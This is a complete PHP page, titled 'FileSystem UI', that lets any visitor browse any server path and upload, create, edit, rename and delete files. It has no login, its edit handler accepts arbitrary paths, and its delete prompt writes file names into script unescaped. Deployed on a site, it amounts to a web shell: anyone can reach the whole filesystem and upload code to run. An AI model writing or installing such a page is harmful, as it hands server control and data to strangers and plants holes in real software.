<?php
$root = realpath($_GET['location'] ?? '.') ?: '.';

function jumpTo($path) {
    header("Location: ?location=" . urlencode($path));
    exit;
}

// Upload file
if (!empty($_FILES['file_upload'])) {
    $uploadPath = $root . '/' . basename($_FILES['file_upload']['name']);
    move_uploaded_file($_FILES['file_upload']['tmp_name'], $uploadPath);
    jumpTo($root);
}

// Create folder
if (!empty($_POST['make_folder'])) {
    $folderPath = $root . '/' . basename($_POST['make_folder']);
    mkdir($folderPath);
    jumpTo($root);
}

// Create file
if (!empty($_POST['make_file'])) {
    $filePath = $root . '/' . basename($_POST['make_file']);
    file_put_contents($filePath, '');
    jumpTo($root);
}

// Remove item
if (!empty($_GET['delete'])) {
    $targetPath = realpath($root . '/' . $_GET['delete']);
    if ($targetPath && strpos($targetPath, $root) === 0) {
        is_file($targetPath) ? unlink($targetPath) : rmdir($targetPath);
    }
    jumpTo($root);
}

// Rename operation
if (!empty($_POST['rename_from']) && !empty($_POST['rename_to'])) {
    $oldItem = $root . '/' . basename($_POST['rename_from']);
    $newItem = $root . '/' . basename($_POST['rename_to']);
    rename($oldItem, $newItem);
    jumpTo($root);
}

// Update file content
if (!empty($_POST['file_name']) && isset($_POST['file_data'])) {
    $editFilePath = realpath($root . '/' . $_POST['file_name']);
    file_put_contents($editFilePath, $_POST['file_data']);
    jumpTo($root);
}

// Load content for edit
$editTarget = $_GET['update'] ?? null;
$contentToEdit = ($editTarget && is_file($root . '/' . $editTarget)) ? file_get_contents($root . '/' . $editTarget) : null;
?>

<!DOCTYPE html>
<html>
<head>
    <title>📁 FileSystem UI</title>
    <style>
        body { font-family: sans-serif; padding: 20px; }
        input, textarea { margin: 6px 0; width: 100%; }
        textarea { height: 200px; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { border: 1px solid #bbb; padding: 8px; text-align: left; }
    </style>
</head>
<body>

<h2>📁 FileSystem UI</h2>
<p><strong>Path:</strong> <?= htmlspecialchars($root) ?></p>
<p><a href="?location=<?= urlencode(dirname($root)) ?>">⬅️ Up One Level</a></p>

<!-- Upload Form -->
<form method="post" enctype="multipart/form-data">
    <input type="file" name="file_upload">
    <button type="submit">Upload</button>
</form>

<!-- New Folder -->
<form method="post">
    <input type="text" name="make_folder" placeholder="Folder name">
    <button type="submit">Create Folder</button>
</form>

<!-- New File -->
<form method="post">
    <input type="text" name="make_file" placeholder="File name">
    <button type="submit">Create File</button>
</form>

<!-- Rename -->
<form method="post">
    <input type="text" name="rename_from" placeholder="Old name">
    <input type="text" name="rename_to" placeholder="New name">
    <button type="submit">Rename</button>
</form>

<!-- File/Folder Listing -->
<table>
    <tr>
        <th>Name</th>
        <th>Type</th>
        <th>Actions</th>
    </tr>
    <?php foreach (scandir($root) as $node): ?>
        <?php if ($node === '.') continue; ?>
        <?php $nodePath = $root . '/' . $node; ?>
        <tr>
            <td><?= is_dir($nodePath) ? '📂' : '📄' ?> <?= htmlspecialchars($node) ?></td>
            <td><?= is_dir($nodePath) ? 'Folder' : 'File' ?></td>
            <td>
                <?php if (is_dir($nodePath)): ?>
                    <a href="?location=<?= urlencode($nodePath) ?>">Open</a>
                <?php else: ?>
                    <a href="<?= htmlspecialchars($nodePath) ?>" target="_blank">View</a>
                    <a href="?location=<?= urlencode($root) ?>&update=<?= urlencode($node) ?>">Edit</a>
                <?php endif; ?>
                <a href="?location=<?= urlencode($root) ?>&delete=<?= urlencode($node) ?>" onclick="return confirm('Delete <?= $node ?>?')">🗑️ Delete</a>
            </td>
        </tr>
    <?php endforeach; ?>
</table>

<!-- Edit Area -->
<?php if ($contentToEdit !== null): ?>
    <hr>
    <h3>✏️ Editing: <?= htmlspecialchars($editTarget) ?></h3>
    <form method="post">
        <input type="hidden" name="file_name" value="<?= htmlspecialchars($editTarget) ?>">
        <textarea name="file_data"><?= htmlspecialchars($contentToEdit) ?></textarea>
        <button type="submit">Save</button>
    </form>
<?php endif; ?>

</body>
</html>
